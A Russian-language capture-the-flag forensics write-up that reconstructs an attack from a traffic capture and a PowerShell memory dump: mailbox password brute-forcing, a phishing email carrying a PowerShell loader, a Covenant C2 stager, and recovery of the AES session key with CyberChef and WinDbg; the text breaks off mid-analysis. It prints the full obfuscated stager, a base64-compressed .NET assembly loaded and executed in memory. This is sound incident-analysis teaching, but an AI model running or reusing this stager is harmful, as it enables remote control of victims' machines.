---
tags:
  - C2
  - covenant
  - http_C2
  - powershell
  - AES
  - memory_dump
  - bruteforce
  - wireshark
  - social_engineering
  - email
  - stager
creation date: 2025-08-10
Содержание:
  - "[[#Задание)"
  - "[[#1. The attacker was able to find the correct pair of credentials for the email service. What were they? Format email password)"
  - "[[#2. What was the body of the email that was sent by the attacker?)"
  - "[[#3. What command initiated the malicious script download?)"
  - "[[#4. What is the initial AES key that is used for decrypting the C2 traffic?)"
  - "[[#5.What is the Administrator NTLM hash that the attacker found?)"
  - "[[#6. What is the flag?)"
  - "[[#Ссылки)"
---
### Задание
Join Tom and Dom on a quest to find out what happens when you look beyond the Event Horizon. A quest beyond borders, they need you to utilize all your abilities to find the secrets that were taken when they crossed over to the other side.

### 1. The attacker was able to find the correct pair of credentials for the email service. What were they?

Нам предоставлен файл pcapng с сетевым трафиком и минидамп сессии powershell с компьютера жертвы - powershell.dmp.
Сначала проанализируем сетевой трафик:

- 10.0.2.45 - ip адрес атакующего
- 10.0.2.46 - ip адрес жертвы

27 августа 2024 года с **06:36:23 (UTC) по 06:36:24** атакующий осуществил сканирование портов жертвы утилитой nmap. На хосте были открыты следующие порты: 
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250811164039.png)
Можем предположить, что жертва с большой долей вероятности - контроллер домена windows, с ролями DNS, DHCP, веб и почтового сервера.

В **06:36:26** злоумышленник заходит на сайт компании со своего браузера:
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250811164633.png)
Из дампа мы видим, что он получил информацию о возможных пользователях домена благодаря контактной информации на сайте.

 **06:36:32 по 06:36:36** - атакующий пытается подобрать пароль от почтовых ящиков пользователей домена. Чаще всего для брутфорса паролей пользователей почтового сервера по словарю используются Hydra, Medusa, Patator и Ncrack. Здесь брутфорс был многопоточным, были открыты одновременно 16 tcp сессий и они не закрывались при неудачном логине. Похоже на работу Медузы. Судя по паролям использовался словарь rockyou:

![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250811172430.png)
Словарь юзернеймов был составлен после посещения сайта компании и просмотра атакующим контактной информации. Попытки брутфорса осуществлялись для следующих УЗ:
 - dom.mark@eventhorizon.thm
 - tom.dom@eventhorizon.thm
 - janice.jay@eventhorizon.thm
 - joan.ray@eventhorizon.thm

В итоге атакующему удалось подобрать пароль для УЗ [REDACTED]@eventhorizon.thm 
Понять это мы можем по ответу pop3 сервера "+OK Mailbox locked and ready" и отследив tcp стрим с этим ответом:
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250811172321.png)
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250809172937%20—%20копия.png)

### 2. What was the body of the email that was sent by the attacker?

В **06:36:41** атакующий заходит на почтовый сервер mail@eventhorizon.thm от юзера [REDACTED] и отправляет письмо на почтовый ящик dom.mark@eventhorizon.thm. К письму прикреплен скрипт powershell "eventhorizon.ps1"

![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250809175036%20—%20копия.png)
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250809175221%20—%20копия.png)
Ответ на второй вопрос - [REDACTED]

### 3. What command initiated the malicious script download?

Скопируем вложение к письму и декодируем его из base64. Получим powershell скрипт:
```powershell
# Constants
$G = 6.67430e-11  # Gravitational constant (m^3 kg^-1 s^-2)
$C = 299792458    # Speed of light (m/s)
$solarMass = 1.989e30  # Mass of the Sun (kg)

# Function to calculate the Schwarzschild radius of a black hole
function Get-SchwarzschildRadius {
    param (
        [double]$mass  # Mass of the black hole (kg)
    )
    return (2 * $G * $mass) / ($C * $C)
}

# Function to calculate the mass of a black hole given its radius
function Get-BlackHoleMass {
    param (
        [double]$radius  # Radius of the black hole (m)
    )
    return ($radius * $C * $C) / (2 * $G)
}

# Given radius of the Sun (approximate)
$sunRadius = 6.96342e8  # Radius of the Sun (meters)

# Calculate the mass of a black hole with the same radius as the Sun
$blackHoleMass = Get-BlackHoleMass -radius $sunRadius

# Display results
Write-Output "The mass of a black hole BB which has the same radius as the Sun is approximately $($blackHoleMass/1e30) solar masses."
Write-Output "In kilograms, this is approximately $blackHoleMass kg."

IEX([REDACTED]))
```

В конце видим команду для загрузки нового скрипта с машины атакующего, это и есть ответ на 3 вопрос - 
`IEX([REDACTED])`

### 4. What is the initial AES key that is used for decrypting the C2 traffic?

Как видим, скрипт eventhorizon.ps1 являлся загрузчиком ВПО. Пользователь dom.mark открыл письмо и выполнил powershell скрипт от имени администратора, так как на его машину в **06:37:13** был загружен новый скрипт с машины атакующего - radius.ps1:
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250809180520.png)

Разберем, что он делает:
```powershell
sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[)@()))|Out-Null

```

Скрипт radius.ps1 декодирует, распаковывает, а затем последовательно записывает и читает из памяти некий массив байт. Затем загружает получившуюся сборку .NET и вызывает ее entry point.

Попробуем понять, что за PE файл выполняется на машине жертвы. Перепишем скрипт, чтобы получить файл для анализа (строка base64 сокращена для читаемости, код переписан Claude Haiku 3.5):

```powershell
# Параметры для сохранения файла
$outputPath = "C:\temp\decoded_assembly.dll"

# Создание потоков для декодирования и распаковки
$memoryStream = New-Object IO.MemoryStream
$deflateStream = New-Object IO.Compression.DeflateStream(
    [IO.MemoryStream][Convert]::FromBase64String('7VprcBv......1+E6//BQ=='),
    [IO.Compression.CompressionMode]::Decompress
)

# Буфер для чтения
$buffer = New-Object Byte[](1024)

# Чтение и декомпрессия данных
$bytesRead = $deflateStream.Read($buffer, 0, 1024)
while ($bytesRead -gt 0) {
    $memoryStream.Write($buffer, 0, $bytesRead)
    $bytesRead = $deflateStream.Read($buffer, 0, 1024)
}

# Получение массива байтов
$assemblyBytes = $memoryStream.ToArray()

# Сохранение файла
[System.IO.File]::WriteAllBytes($outputPath, $assemblyBytes)

# Закрытие потоков
$deflateStream.Dispose()
$memoryStream.Dispose()

Write-Host "Сборка сохранена в $outputPath"
```

Теперь, когда у нас есть сохраненный файл можно проверить его хэш в virus total:
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250810094737.png)

Судя по всему, скрипт содержит stager Grunt'a (агента) С2 Covenant. Здесь можно изучить его исходный код - https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs

Посмотрим строки и найдем всю необходимые заголовки для http коммуникации агента с С2 сервером, обычно в кодировке base64:
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250810100034%20—%20копия.png)
Например, здесь строка `TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==` - User-Agent для стэйджера (Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36), а следующие строки - эндпоинты, которые выбираются Грантом (агентом) Covenant рандомно для получения команд от сервера, маскирующегося под веб-сайт:
```
L2VuLXVzL2luZGV4Lmh0bWw=  =>   /en-us/index.html
L2VuLXVzL2RvY3MuaHRtbA==  =>   /en-us/docs.html
L2VuLXVzL3Rlc3QuaHRtbA==  =>   /en-us/test.html
```

Здесь же мы можем найти AES ключ в формате base64:
`l[REDACTED]8=`


### 5.What is the Administrator NTLM hash that the attacker found?
Расшифруем коммуникацию.
В трафике мы видим, что жертва после запуска stager'а отправляет GET и POST запросы с зашифрованными данными к С2 серверу на порт 8081 по протоколу http:
![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250810103848.png)
Отфильтруем коммуникацию и получим всего 64 пакета:
`tcp.port == 8081 && http && !(http.response.code == 100)`

После первого пустого запроса, жертва отправляет на сервер POST запрос со следующим содержимым:
```html
i=a19ea23062db990386a3a478cb89d52e&data=eyJHVUlEIjoiNTZmMjM2ZTUyMDlkZmFhNTNhYWEiLCJUeXBlIjowLCJNZXRhIjoiIiwiSVYiOiIzVFhPWm1hNG90bDFOUHI3cDJaZ0JBPT0iLCJFbmNyeXB0ZWRNZXNzYWdlIjoidXRSb0E5SWZsR3BNNS8ySUZDSURwVW1QNU1GMWJwTWwyQ3ZEVU5VcSt5TEhrZTBTQVJXQWlWMjM4ZVdyays1TUdEMkZhY0xFWDhhdFdyMHJPQzY3YzJWZWlNL09TK3NTN2EvamJQRGZxbW1XTEZlZ0s3MG9JZHgxQzlrN0tJV1RIeVJxZndRbTN1TCtUdkJCM0ZEUkUwWGtNbnRRL3F6ZkdWYUNYL3ZtSmRhbEh3b0w3dU1WYkNDakR2c2hIeVRMeEFpQUFlSHV5bThCK1RDUUFWQkdEMjBpS29mVzFvcUw4ZDg3WCtXR3pqOENJUWFHSkI5aWt4UG9ISE5wTTNndW9IWkxCTmxmN1dVMmlPem1NUzE5NjE2RzRtR1lOTVFXWU01T2VXOEFxTnIrd2VzbXpSWGdMbUFNSFFKdzB5Z25uazgzY1psZFlUK2dsRUhuZi9jNkkrTER1WFMzeXBnU29GY3dSeTJ0TVdSZmpaMjErMjUvNVdCSUE4MUFJeFF1b0pSd3pEZUJsYVR3RTNkZGhMaFg1T1FldGE2aW4xNWtuQTkwY3N1akl5VFJHTG4rWlZyK293Qks3MjdJSTJNSUIxNXBwWUNHVGkvcGxRT3c0ME5oZGF4aGVOemxpWjRGU0FUd0lHN3l6eU5yTm5ZbnFhcEVLSC9peWJLLzdlNGVuTkNTclp1ZkFLalRsV3NLQStBM3VqZ2Q1NU5BSTFwTEtaemhkY1pOcVl3PSIsIkhNQUMiOiJuRUxSSldRMDh6d2NCdW00QzJWbHVSaDN5bmpnNzY5TWM2WTcrSmszRGo4PSJ9&session=75db-99b1-25fe4e9afbe58696-320bea73
```

Декодируем поле data:
```json

{"GUID":"56f236e5209dfaa53aaa","Type":0,"Meta":"","IV":"3TXOZma4otl1NPr7p2ZgBA==","EncryptedMessage":"utRoA9IflGpM5/2IFCIDpUmP5MF1bpMl2CvDUNUq+yLHke0SARWAiV238eWrk+5MGD2FacLEX8atWr0rOC67c2VeiM/OS+sS7a/jbPDfqmmWLFegK70oIdx1C9k7KIWTHyRqfwQm3uL+TvBB3FDRE0XkMntQ/qzfGVaCX/vmJdalHwoL7uMVbCCjDvshHyTLxAiAAeHuym8B+TCQAVBGD20iKofW1oqL8d87X+WGzj8CIQaGJB9ikxPoHHNpM3guoHZLBNlf7WU2iOzmMS19616G4mGYNMQWYM5OeW8AqNr+wesmzRXgLmAMHQJw0ygnnk83cZldYT+glEHnf/c6I+LDuXS3ypgSoFcwRy2tMWRfjZ21+25/5WBIA81AIxQuoJRwzDeBlaTwE3ddhLhX5OQeta6in15knA90csujIyTRGLn+ZVr+owBK727II2MIB15ppYCGTi/plQOw40NhdaxheNzliZ4FSATwIG7yzyNrNnYnqapEKH/iybK/7e4enNCSrZufAKjTlWsKA+A3ujgd55NAI1pLKZzhdcZNqYw=","HMAC":"nELRJWQ08zwcBum4C2VluRh3ynjg769Mc6Y7+Jk3Dj8="}
```

Сообщение зашифровано AES 256-битным ключом, тут же приведен IV для расшифровки. Используем cyberchef и найденный нами ранее AES ключ:

![](https://github.com/1L0N4/WriteUps-Reports/blob/main/Forensics/attachments/Pasted%20image%2020250811193432.png)

Получим вот такое сообщение, содержащее публичный RSA ключ:
```xml
<RSAKeyValue><Modulus>uu9b7lb3AED0j5r+qW4SDYlC0LZLPF5crPx9lkWafZZ+FDK2HuKnEtqjb9Xu8XEtc6Gb4dIi4DVGAjSKCpPBSvzrmBi/nqQbkuBVlzbv1l7lqZEYtL4z8N58YGrUuh2jeyKKtIfDJlUy5zT1Eer7xyKbykq8xP16tGXZe8Xb+oocmb72DPoH4mvnV1b+Q7JYE68gHSqgbOURy7jVecg8ragwdUNjvo3y2krQOdRRE/zuds+0I9abE26la+GnRw0C8qNnX4xGpoVlMiqiQoaiZoUSmODNkK7L3Ye6v++hM7Gyrl8fvbC5jlF7dSjjX9m/I1mZPkzrIbVk9cUdaWJVXQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
```

RSA шифрование нужно для того чтобы безопасно передать новый сессионный AES ключ, не захардкоженный в самом стэйджере. Это видно по смене GUID и тому, что старый AES ключ больше не работает. Для поиска нового нам и пригодится дамп памяти процесса powershell.
Смена GUID в следующих сообщениях:
```json
{"GUID":"56f236e5209dfaa53aaa","Type":0,"Meta":"","IV":"3TXOZma4otl1NPr7p2ZgBA==","EncryptedMessage":"utRoA9....","HMAC":"nELRJWQ08zwcBum4C2VluRh3ynjg769Mc6Y7+Jk3Dj8="}

{"GUID":"9dfaa53aaa","Type":1,"Meta":"","IV":"4CaBdaqBY5GHdc0+lKcyAA==","EncryptedMessage":"/tg1apIXcD.....","HMAC":"pOZmCZymed+xew1CnRRIe5IXqOd4bOPKhQ8iPfl+3Hk="}
{"GUID":"9dfaa53aaa","Type":1,"Meta":"","IV":"tAYO/O/Y8wL0pqr2CjnY6A==","EncryptedMessage":"i52Y8f8djEMz...."
```

Можно использовать разные методы и инструменты для поиска ключа и анализа дампов процессов. Например Volatility, binwalk, YARA правила, скрипты (сигнатурный поиск). Попробуем с winDbg:
- Посмотрим, что было в куче на момент снятия дампа и поищем объекты, связанные с Grunt Covenant: 
```
0:000> .shell -ci "!DumpHeap -stat" findstr /i Grunt
00007ffa4780b178        1           24 GruntExecutor.IMessenger[]
00007ffa4780a4f0        1           24 GruntExecutor.Grunt+<>c
00007ffa4780a198        1           24 GruntExecutor.Grunt+<>c__DisplayClass0_0
00007ffa47809628        1           24 GruntExecutor.GruntTaskingType
00007ffa47807ee0        1           24 GruntStager.GruntStager+<>c
00007ffa47807820        1           24 GruntStager.GruntStager
00007ffa4780a9a8        1           32 GruntExecutor.HttpMessenger+<>c__DisplayClass43_0
00007ffa47809358        1           32 GruntExecutor.MessageCrafter
00007ffa47807948        1           32 GruntStager.GruntStager+<>c__DisplayClass3_0
00007ffa4780ab00        1           40 System.Collections.Generic.List`1[[GruntExecutor.IMessenger, gmhuzgmv.efr)
00007ffa478098a0        1           40 GruntExecutor.GruntTaskingMessage
00007ffa47808ac8        1           40 GruntExecutor.Profile
00007ffa47809d60        2           48 GruntExecutor.GruntEncryptedMessage+GruntEncryptedMessageType
00007ffa47808cb8        1           72 GruntExecutor.TaskingMessenger
00007ffa478091d0        1          112 GruntExecutor.HttpMessenger
00007ffa47809eb8        3          192 GruntExecutor.GruntEncryptedMessage
00007ffa47809480        1          344 GruntExecutor.CookieWebClient
00007ffa47807ca0        1          344 GruntStager.GruntStager+CookieWebClient
```
- Grunt MessageCrafter выглядит интересно, поэтому посмотрим адрес этого объекта
```
0:000> !DumpHeap /d -mt 00007ffa47809358
         Address               MT     Size
000001f1534c8b80 00007ffa47809358       32     

Statistics:
              MT    Count    TotalSize Class Name
00007ffa47809358        1           32 GruntExecutor.MessageCrafter
Total 1 objects
```
- сдампим этот объект:
```
0:000> !DumpObj /d 000001f1534c8b80
Name:        GruntExecutor.MessageCrafter
MethodTable: 00007ffa47809358
EEClass:     00007ffa47842e80
Size:        32(0x20) bytes
File:        gmhuzgmv.efr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
Fields:
              MT    Field   Offset                 Type VT     Attr            Value Name
00007ffaa40059c0  400001f        8        System.String  0 instance 000001f1533665e8 <GUID>k__BackingField
00007ffaa3ffade8  4000020       10 ....Cryptography.Aes  0 instance 000001f1533d8b18 <SessionKey>k__BackingField
```
- Здесь мы видим поле с сессионным ключом - `<SessionKey>`, сдампим объект и поищем что-нибудь, связанное с хранением ключей:
```
0:000> !DumpObj /d 000001f1533d8b18
Name:        System.Security.Cryptography.AesCryptoServiceProvider
MethodTable: 00007ffa9c6e3fa0
EEClass:     00007ffa9c85dec8
Size:        88(0x58) bytes
